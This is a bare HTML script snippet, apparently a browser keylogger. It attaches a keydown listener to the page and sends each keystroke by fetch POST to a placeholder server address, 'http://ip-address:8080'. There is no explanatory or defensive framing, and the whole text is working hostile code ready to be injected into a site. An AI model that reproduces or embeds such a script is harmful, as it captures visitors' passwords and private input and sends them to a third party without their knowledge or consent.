<script>
    document.addEventListener('keydown', function(event) {
        // Prepare the data to send
        var keystroke = 'key=' + encodeURIComponent(event.key);

        // Send the keystroke data to the server
        fetch('http://ip-address:8080', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: keystroke
        });
    });
</script>

